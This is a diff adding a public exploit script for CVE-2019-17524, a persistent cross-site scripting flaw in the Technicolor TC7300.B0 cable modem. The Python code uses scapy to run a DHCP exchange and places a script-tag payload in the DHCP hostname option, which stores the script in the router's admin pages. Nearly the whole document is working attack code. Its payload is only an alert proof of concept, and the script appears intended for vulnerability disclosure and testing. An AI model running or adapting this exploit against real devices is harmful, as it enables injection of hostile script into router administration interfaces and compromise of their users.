@@ -1,0 +1,89 @@
+# Exploit Title: Technicolor TC7300.B0 - 'hostname' Persistent Cross-Site Scripting
+# Google Dork: N/A
+# Date: 2019-11-11
+# Exploit Author: Luis Stefan
+# Vendor Homepage: https://www.technicolor.com/
+# Software Link: N/A
+# Version: TC7300.B0 - STFA.51.20
+# Tested on: macOS Mojave and Catalina
+# CVE : 
+
+#!/usr/bin/env python3
+__author__ = "Luis Stefan"
+__license__ = "MIT"
+__version__ = "1.0"
+__email__ = "luis.ss@protonmail.com"
+__description__ = """CVE-2019-17524.py: This script is used to exploit a xss vulnerability found in a technicolor device."""
+
+from enum import IntEnum
+from scapy.all import *
+import codecs, threading, time
+
+# Define your network interface
+interface = 'en0'
+# Insert your interface card mac address
+mac = 'xx:xx:xx:xx:xx:xx'
+broadcast = 'ff:ff:ff:ff:ff:ff'
+mac_hxd = codecs.decode(mac.replace(':', ''),'hex')
+
+class Bootp(IntEnum):
+    Discover = 1
+    Offer = 2
+    Request = 3
+    Decline = 4
+    Ack = 5
+    Nak = 6
+    Release = 7
+
+def dhcp_discover():
+    disc_pkt = Ether(src=mac, dst=broadcast) / \
+        IP(src='0.0.0.0', dst='255.255.255.255') / \
+        UDP(dport=67, sport=68) / BOOTP(chaddr=mac_hxd) / \
+        DHCP(options=[('message-type', 'discover'), 'end'])
+    sendp(disc_pkt, iface=interface)
+
+def dhcp_request(pkt):
+    yraddr = pkt['BOOTP'].yraddr
+    # gwaddr == Gateway Ip Address
+    gwaddr = '192.168.0.1'
+    param_req_list = []
+    hostname = "<script>alert('XSS triggered')</script>"
+    req_pkt = Ether(src=mac, dst=broadcast) / \
+        IP(src='0.0.0.0', dst='255.255.255.255') / \
+        UDP(dport=67, sport=68) / BOOTP(chaddr=mac_hxd) / \
+        DHCP(options=[('message-type', 'request'), ('server_id', gwaddr),
+                      ('requested_addr', yraddr), ('hostname', hostname), 'end'])
+    sendp(req_pkt, iface=interface)
+
+def dhcp(pkt):
+    print(pkt.display())
+    print("#############################################################")
+    if pkt.haslayer(DHCP) and pkt['DHCP'].options[0][1] == Bootp.Offer:
+        dhcp_request(pkt)
+    elif pkt.haslayer(DHCP) and pkt['DHCP'].options[0][1] == Bootp.Ack:
+        print("Server Acknowledged")
+        sys.exit(0)
+    elif pkt.haslayer(DHCP) and pkt['DHCP'].options[0][1] == Bootp.Decline:
+        print("Server Declined")
+        sys.exit(0)
+    elif pkt.haslayer(DHCP) and pkt['DHCP'].options[0][1] == Bootp.Nak:
+        print("Server Nak")
+        sys.exit(0)
+
+
+def ver_dhcp():
+    print("Verifying DHCP port traffic..")
+    sniff(iface=interface, prn=dhcp, filter="port 68 and port 67", timeout=20)
+    sys.exit(0)
+
+
+def main():
+    t1 = threading.Thread(target=ver_dhcp, args=())
+    t1.setDaemon = True
+    t1.start()
+    time.sleep(2)
+    dhcp_discover()
+
+
+if __name__ == "__main__":
+    main()
